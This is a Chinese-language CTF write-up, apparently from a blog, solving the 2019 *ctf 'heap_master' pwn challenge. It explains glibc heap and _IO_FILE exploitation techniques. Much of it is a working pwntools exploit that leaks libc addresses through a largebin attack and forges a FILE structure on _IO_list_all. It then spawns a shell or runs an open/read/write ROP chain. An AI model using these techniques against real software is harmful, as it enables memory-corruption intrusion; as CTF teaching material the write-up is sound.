<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[5种方法解2019_*ctf_heap_master来加深对深层次堆利用手段的理解（完成度80%）]]></title>
    <url>%2F2019%2F07%2F05%2F%E4%BA%94%E7%A7%8D%E6%96%B9%E6%B3%95%E8%A7%A3heap_master%2F</url>
    <content type="text"><![CDATA[作为2019年*ctf的倒数第二题pwn题，这道题的程序逻辑却意外的简单，这也就意味着利用起来会有不小的困难（一般程序复杂的题洞难找但利用起来不会太过刁难，程序简单的题利用起来反而困难）。 这道heap_master从名字看就知道需要对ptmalloc2的机制和堆的各种利用方法都非常熟悉才能成为heap的master而不是heap_baby。。QAQ。。。这篇文章也算是集百家之长了。。。借鉴了天枢的师傅和其他一些大师傅的wp，又查了许多资料才汇总出这一篇拙作。 heap_master 一些必须知道的前置知识准备和利用手段：global_fast_max:简答的来说global_fast_max就是一个全局变量，他的作用是控制fastbinY[]的阈值，正常情况下其值为0x80，也就是大小在0x80之内的都可以放进fastbinY[]里，所以如果更改了global_max_fast的值，那fastbinY[]的范围将超标，实现fastbin_index_overflow，所以当我们free一个size极大且经过精心构造的victim_chunk时，就实现了可以几乎任意地址（在main_arena+88之后）写入victim_chunk的地址，之后比较常见的几种利用方式是： 改写_IO_list_all，伪造_IO_file_plus来劫持程序控制流。 改写stdout流，使其指向我们可控的地址，并在其上伪造一个IO_file_plus，常用来泄露libcbase。 stdin同上，但可以用来任意地址写。 stderr同上，但有更多的姿势。 改写__free_hook为system_addr，第五种方法就是利用这个。 size的计算方式为： 123fastbin_ptr = main_arena_addr + 8idx = (target_addr - fastbin_ptr) / 8 #target_addr为我们想要写入的地址。size = idx*0x10 + 0x20 #size为我们应该free的chunk的大小。 dl_open_hook:这种控制程序执行的方式是官方wp里面提到的，通过largebin attack/unsortedbina attack可以将_dl_open_hook覆盖为mmap出来的内存的地址，然后通过malloc或free报错的方式（也就是malloc_printerr），程序将会调用__libc_dlopen_mode函数，在其中会把dl_open_hook的值加载到某个寄存器，然后会call该寄存器，也就是我们获得一次劫持程序ip的机会，但是寄存器们却没法控制，需要和下面我们要讲的setcontext结合来使用才能发挥最大威力。图片来源e3pem setcontext:在pwndbg的magic功能中，我们看到有setcontext+0x35这个变量，现在终于用到了。 看一下这个玩意到底是啥： 12345678910111213141516170x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0]0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80]0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78]0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48]0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50]0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58]0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60]0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8]0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70]0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88]0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98]0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28]0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30]0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68]0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax0x7ffff7a7a5af &lt;setcontext+127&gt;: ret 我们可以看到这一段巨型gadget，几乎控制了我们所有的寄存器，只要我们可以控制rdi所指向的地址及其后0xa8的内容，就可以劫持程序执行流了。其中这几个位置比较重要： 12345678rsp = [rdi+0xa0]ret_addr = [rdi+0xa8] #push rcx; ......... ret; 开始的rcx作为缓冲区，必须装指令的地址。rdi = [rdi+0x68]rsi = [rdi+0x70]rdx = [rdi+0x88]rcx = [rdi+0x98]r8 = [rdi+0x28]r9 = [rdi+0x30] __after_morecore_hook:这玩意和setcontext+53一样，我也是在magic命令里发现了他，现在找了不少资料也没有完全搞懂他的用法，大致的用法是在sysmalloc里操作系统被要求更多内存后，调用sbrk之后使用： 1234567891011if (brk != (char *) (MORECORE_FAILURE)) //sbrk分配成功 &#123; /* Call the `morecore' hook if necessary. */ void (*hook) (void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect (hook != NULL, 0)) (*hook)(); //&lt;------这里 &#125;else &#123; …… &#125; 如果sbrk分配成功，并且MORECORE的__after_morecore_hook函数存在，则调用这个函数。（还不清楚其原本目的是用来干嘛的）。待我啃一啃sysmalloc源码之后再来尝试利用这个破玩意，现在似乎还没出现以他为利用方式为题目。 chroot:chroot作用：chroot命令改变其当前目录，并将根目录变为指定目录，然后如果提供了命令则运行命令，也可以运行一个用户的交互式shell的副本。由chroot创造出的那个根目录，叫做“chroot监狱”（chroot jail，或chroot prison） 这道题就使用了chroot来使我们没法拿shell，只能通过orw来读取flag。 timeout 60 chroot –userspec=pwn:pwn ./ ./heap_master 这句话的意思是：运行时间不超过60s，使用pwn用户组的pwn用户，以当前文件夹为根目录，运行./heapmaster 超过60秒就kill掉进程。因为当前目录为根目录，所以我们就没办法打开shell了，因为当前目录啥都没有，没有bin，也没有sh（可执行文件），应该只有一个flag文件，还有一些其他的配置文件，所以肯定要使用orw来直接读flag。 mprotect与mmap:两个函数的man手册描述： 123456789101112131415161718192021222324252627282930NAME mprotect — set protection of memory mappingSYNOPSIS #include &lt;sys/mman.h&gt; int mprotect(void *addr, size_t len, int prot);DESCRIPTION The mprotect() function shall change the access protections to be that speci‐ fied by prot for those whole pages containing any part of the address space of the process starting at address addr and continuing for len bytes. The parame‐ ter prot determines whether read, write, execute, or some combination of accesses are permitted to the data being mapped. The prot argument should be either PROT_NONE or the bitwise-inclusive OR of one or more of PROT_READ, PROT_WRITE, and PROT_EXEC.NAME mmap — map pages of memorySYNOPSIS #include &lt;sys/mman.h&gt; void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);DESCRIPTION The mmap() function shall establish a mapping between an address space of a process and a memory object. mprotect函数用于改变某段地址的权限（rwxp） 这道题目开启了 NX 保护，因此可以考虑通过mprotect改变mmap_addr的权限，然后注入shellcode再劫持程序执行流，mprotect指定的内存区必须包含整个内存页，区间长度必须是页大小的整数倍，重点介绍如何使用mprotect。 函数原型是int mprotect(void *addr, size_t len, int prot);，addr是内存地址开头，len 是长度，prot 就是权限位，在 manpage 上有 PROT_WRITE、PROT_EXEC、PROT_READ 等几项，权限是位运算之后的数字，根据宏定义， rwx权限 就是 0x1 | 0x2 | 0x4，也就是7。 mmap用于申请一段空间，根据参数不同可以设置这段空间的权限。 mmap可以申请一段空间，但麻烦在需要控制 6 个参数，对 64 位的程序而言，也就是需要找到能控制 rdi, rsi, rdx, rcx, r8, r9 的 gadget，大部分情况是需要和setcontext+53配合使用。具体使用方法我就不赘述了。 _IO_str_jumps与_IO_list_all：_IO_file_pwn是现在最常用的pwn手段之一，因为没有程序能离开他，只要有输入输出函数和报错(malloc_printerr，exit()甚至main return)的机会，就有可能使用到_IO_file_pwn。之前也做了不少题目关于这个方面的，在这里终于有机会自己总结一下了。。。先亮出三个结构体。 12345struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; /* offset 0x68 (64bits) */ int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE //开始宏判断（这段判断结果为否，所以没有定义_IO_FILE_complete，下面还是_IO_FILE）&#125;;struct _IO_FILE_complete&#123; struct _IO_FILE _file;#endif //结束宏判断#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001 //依然是_IO_FILE的内容 _IO_off64_t _offset;# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf;# else void *__pad1; void *__pad2; void *__pad3; void *__pad4;# endif size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];#endif&#125;; _IO_file的利用主要分为两种： 利用stdout和stdin文件输入输出流进行地址泄露和数据修改。 利用_IO_list_all进行程序控制流的劫持。 第一种利用方式：泄露地址的利用方法很简单，只要有办法向_IO_2_1_stdout结构体写入东西，就有机会成功，需要达成两个条件：（之后会根据题目详解两个条件） f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1 _IO_write_base!=_IO_write_ptr 任意地址写的条件比较苛刻，题目好久之前做过一道，具体都记不清了，有时间再来总结：2018_hctf_babyprintf_ver2 第二种利用方式：通过_IO_list_all劫持程序控制流。我们大家最熟悉的house of orange就是在libc2.23下诞生的在当时最新型的利用方式，网上大师傅们的分析也非常全面细致，我就不再浪费时间了，以下结构体和函数源码部分摘抄与veritas501 house_of_orange最后的劫持程序执行流部分： 我们在malloc的时候程序会出错，调用malloc_printerr函数，如下 1234if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av);c 而malloc_printerr则又调用了__libc_message。 1234567891011121314151617181920212223242526static voidmalloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)&#123; /* Avoid using this arena in future. We do not attempt to synchronize this with anything else because we minimally want to ensure that __libc_message gets its resources safely without stumbling on the current corruption. */ if (ar_ptr) set_arena_corrupt (ar_ptr); if ((action &amp; 5) == 5) __libc_message (action &amp; 2, "%s\n", str); else if (action &amp; 1) &#123; char buf[2 * sizeof (uintptr_t) + 1]; buf[sizeof (buf) - 1] = '\0'; char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0); while (cp &gt; buf) *--cp = '0'; __libc_message (action &amp; 2, "*** Error in `%s': %s: 0x%s ***\n", __libc_argv[0] ? : "&lt;unknown&gt;", str, cp); &#125; else if (action &amp; 2) abort ();&#125; 而__libc_message则又调用了abort。 1234567891011121314/* Abort with an error message. */void__libc_message (int do_abort, const char *fmt, ...)&#123;...... if (do_abort) &#123; BEFORE_ABORT (do_abort, written, fd); /* Kill the application. */ abort ();//调用abort &#125;&#125; 而abort则又调用了fflush。 123456789101112131415/* Cause an abnormal program termination with core-dump. */voidabort (void)&#123;...... /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if (stage == 1) &#123; ++stage; fflush (NULL);//调用fflush &#125; ...... 而fflush其实就是_IO_flush_all_lockp。 1#define fflush(s) _IO_flush_all_lockp (0) 而_IO_flush_all_lockp中用到了_IO_list_all，并最终通过vtable调用了_IO_OVERFLOW。 12345678910111213141516171819202122232425262728293031323334int _IO_flush_all_lockp (int do_lock)&#123;...... last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; //_IO_list_all赋给fp while (fp != NULL) &#123;...... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)//需要bypass的条件#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))//需要bypass的条件#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)//改 _IO_OVERFLOW 为 system 劫持程序流！ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain;//指向下一个fp（从main_arena到heap） &#125;......&#125; 由于逻辑短路原则，想要调用后面的_IO_OVERFLOW (fp, EOF)，前面的条件必须满足，即： 1234561.fp-&gt;_mode &lt;= 02.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base或1._IO_vtable_offset (fp) == 02.fp-&gt;_mode &gt; 03.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base （主推第一种。。。） 主要想总结一下libc2.24以后的利用方法。 glibc2.24下：因为glibc2.24对vtable指针进行了检查，所以我们就不能自由改写vtable了，但是随之而来的产生了一个新的方法：利用_IO_str_jumps结构体，其和IO_jump_t一样，其成员也全部是函数指针。 123456789101112131415161718192021222324pwndbg&gt; p _IO_str_jumps $1 = &#123; __dummy = 0, __dummy2 = 0, __finish = 0x7ff39312db70 &lt;_IO_str_finish&gt;, __overflow = 0x7ff39312d850 &lt;__GI__IO_str_overflow&gt;, __underflow = 0x7ff39312d7f0 &lt;__GI__IO_str_underflow&gt;, __uflow = 0x7ff39312c370 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ff39312db50 &lt;__GI__IO_str_pbackfail&gt;, __xsputn = 0x7ff39312c3d0 &lt;__GI__IO_default_xsputn&gt;, __xsgetn = 0x7ff39312c550 &lt;__GI__IO_default_xsgetn&gt;, __seekoff = 0x7ff39312dca0 &lt;__GI__IO_str_seekoff&gt;, __seekpos = 0x7ff39312c730 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ff39312c600 &lt;_IO_default_setbuf&gt;, __sync = 0x7ff39312c9b0 &lt;_IO_default_sync&gt;, __doallocate = 0x7ff39312c7a0 &lt;__GI__IO_default_doallocate&gt;, __read = 0x7ff39312d6a0 &lt;_IO_default_read&gt;, __write = 0x7ff39312d6b0 &lt;_IO_default_write&gt;, __seek = 0x7ff39312d680 &lt;_IO_default_seek&gt;, __close = 0x7ff39312c9b0 &lt;_IO_default_sync&gt;, __stat = 0x7ff39312d690 &lt;_IO_default_stat&gt;, __showmanyc = 0x7ff39312d6c0 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ff39312d6d0 &lt;_IO_default_imbue&gt;&#125; 我们主要把目光放到两个函数上： _IO_str_overflow（_GI_IO_str_overflow）:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int _IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES)// pass return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))// should in &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ // pass return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen)//pass 一般会通过 return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);//target [fp+0xe0] if (new_buf == NULL) &#123; /* __ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, '\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125;libc_hidden_def (_IO_str_overflow) 我们可以固定的这么构造： 1234567_flags = 0_IO_write_ptr = 0x7fffffffffffffff //极大即可_IO_write_base = 0_IO_buf_end = (binsh_addr-100)/2 //(addr_of_first_arry-100)/2_IO_buf_base = 0fp+0xe0 = addr_of_func/gadget/one_gadgetfp+0xd8 = addr_of_IO_str_jumps 我们把_IO_list_all的值改为我们可控的地址，在这个地址上伪造_IO_file_plus，将vtable设为_IO_str_jumps的地址，然后当程序发生：malloc_printerr，exit()，main函数return之一时，程序就会调用：__libc_message-&gt;abort-&gt;fllush/_IO_flush_all_lockp(从_IO_list_all开始清理文件结构体)-&gt;伪造的vtable(_IO_str_jumps_addr)-&gt;调用_IO_str_overflow-&gt;获得一次任意地址call的机会。 _IO_str_finish:这个函数要比_IO_str_overflow要简单的多。 12345678void _IO_str_finish (_IO_FILE *fp, int dummy)&#123; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) //唯一需要bypass的条件 (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);// getshell ， [fp+0xe8] fp-&gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);&#125; 我们可以这样构造： 1234_flags = 0_IO_buf_base = binsh_addr //addr_of_first_arryfp+0xe8 = addr_of_func/gadget/one_gadgetfp+0xd8 = addr_of_IO_str_jumps - 8 在这道题中会显示这两个函数的具体使用方法。 第一种方法：思路：第一种方法是用largebin_attack的两次向任意地址写victim的地址，来对stdout结构体的flag(需满足f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1)和_IO_write_base的最后一个字节（错位写入，修改_IO_read_base的前七个字节和_IO_write_base的最后一个字节，victim的地址长度不够八个字节会将缺的位自动当为零写入）进行修改，利用mmap地址的随机性（大概1/16的概率）可以泄露出mmap的地址的基址和libc的地址。 然后再利用largebin_attack向_IO_list_all写入victim的地址，在victim处伪造一个fake_IO_file_plus，利用exit()中的_IO_flush_all_lockp调用_IO_str_overflow（所以在fp+0xd8处（也就是vtable处）我们应填入_IO_str_jumps的地址），利用_IO_str_overflow中的call [rdi+0xe0]来进行程序控制流的劫持(rdi里装的是_IO_str_overflow的第一个参数fp，也就是当前的文件结构体指针)，这里因为远程只能用orw(open read write)来读取flag，但是在本地的话可以直接用one_gadget或者system(&#39;/bin/sh\x00&#39;)来打开shell，所以在exp的最后地方会有一个分支。 除此之外，我还用了上面已经说过了的_IO_str_overflow和_IO_str_finish的方法来劫持程序执行流，具体的构造方法上面已经说得很详细 ，而且可以根据具体情况自己调试来自己修改构造。对于choice = 4的orw的思路，我是借鉴了天枢e3pem学长的题解，他的文章已经说得很清晰明了，包括在libc-2.25的环境下的调试和exp学长也已经给出，我就不敢再赘述（在文末已贴出链接）。 exp如下(libc-2.23)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new_(p,size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade_(p,offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete_(p,offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): while 1: try: p = process('./heap_master') new = lambda x: new_(p,x) upgrade = lambda x,y: upgrade_(p,x,y) delete = lambda x: delete_(p,x) offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(0x2620-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(0x2620-0x20+0x19)) delete(offset+0x10) new(0x60) p.recv(0x18) libcbase = u64(p.recv(8)) - (0x7f1f383306e0-0x7f1f37f6d000) log.success('libcbase = '+hex(libcbase)) mmap_addr = u64(p.recv(4).ljust(8,'\x00')) - (0xb800-0x6000) log.success('mmap_addr = '+hex(mmap_addr)) #------------------------------leak success and largebin_attack again--------------- _IO_list_all_addr = libcbase + 0x3c5520 _IO_str_jumps_addr = libcbase + 0x7f1517e807a0 - 0x7f1517abd000 log.success('_IO_list_all_addr = '+hex(_IO_list_all_addr)) log.success('_IO_str_jumps_addr = '+hex(_IO_str_jumps_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(_IO_list_all_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(_IO_list_all_addr-0x20)) delete(offset+0x10) new(0x60) #------------------------modify_IO_list_all success------------------------------- choice = 1 #1:one_gadget 2:_IO_str_finish:system('/bin/sh\x00') 3:_IO_str_overflow:system('/bin/sh\x00') 4:orw if choice == 1: one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147] upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(libcbase + one_gadget[1])) if choice == 2: fake_IO_file = p64(0) #flag = 0 fake_IO_file+= p64(0)*3 fake_IO_file+= p64(0) #_IO_write_base fake_IO_file+= p64(1) #_IO_write_ptr fake_IO_file+= p64(1) #_IO_write_end fake_IO_file+= p64(mmap_addr) #_IO_buf_base = addr_of_bin_sh upgrade(0,'/bin/sh\x00') upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr-8)) upgrade(offset+0xe8,p64(libcbase + libc.sym['system'])) if choice == 3: fake_IO_file = p64(0) #flag = 0 fake_IO_file+= p64(0)*3 fake_IO_file+= p64(0) #_IO_write_base fake_IO_file+= p64(0xffffffff) #_IO_write_ptr fake_IO_file+= p64(0) #_IO_write_end fake_IO_file+= p64(0) #_IO_buf_base = 0 fake_IO_file+= p64((mmap_addr-100)/2) #_IO_buf_base = (arry_addr-100)/2 upgrade(0,'/bin/sh\x00') upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(libcbase + libc.sym['system'])) if choice == 4: p_rdi = libcbase + 0x21102 p_rdx_rsi = libcbase + 0x1150c9 p_rsp = libcbase + 0x3838 p_rsp_r13 = libcbase + 0x206c3 p_rbx_rbp_j_rdx = libcbase + 0x12d751 orw = [ p_rdi,mmap_addr, p_rdx_rsi,0,0, libcbase+libc.sym['open'], p_rdi,3, p_rdx_rsi,0x100,mmap_addr+0x1000, libcbase+libc.sym['read'], p_rdi,1, p_rdx_rsi,0x100,mmap_addr+0x1000, libcbase+libc.sym['write'], ] fake_IO_file = p64(0) fake_IO_file+= p64(p_rsp) fake_IO_file+= p64(mmap_addr+8) fake_IO_file+= p64(0) fake_IO_file+= p64(0) fake_IO_file+= p64(p_rsp_r13) upgrade(0,'./flag\x00\x00' + flat(orw)) upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(p_rbx_rbp_j_rdx)) #gdb.attach(p) p.recvuntil('&gt;&gt; ') p.sendline('0') break except: p.close() p.interactive()if __name__ == '__main__': mypwn() 心得： 关于f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1，这个flag的构造方法其实很简单，分成两部分来看，第一部分：f-&gt;flag &amp; 0xa00!=NULL，和1010 0000 0000按位与不为NULL的话，很简单只要保证是0x8xx或者0x2xx或者0xaxx就行了，这也是为什么我们看到的很多构造是flag = 0xfbad1800或者0xfbad2877啥的，其后三位都是0x8xx，第二部分：f-&gt;flag &amp; 0x1000 == 1，这个更简单了，和0001 0000 0000 0000按位与不为0即可，这个利用mmap地址的随机性随便都能成立吧。 我们选择进行largebin_attack的两块chunk的大小不能随意选择或差距过大，因为一条链的chunk大小是有范围的，（看表格你会发现好像我这道题用的chunk的size（0x4f0和0x510）明明是分在两个链上的。。但实际上那个size=0x4f0的chunk之前的size是等于0x510的，我是先把他放进去再改的大小。。。正常情况是不能这么做的。）图片来源:veritas501 一次largebin_attack可以向任意两个地址同时写victim_addr一次，一次unsortedbin_attack可以向一个任意地址写main_arena+88一次，但是写完之后这条largebin和unsortedbin都会损坏，如需继续使用我们需要注意修补。（largebin可以直接换一条链。。） 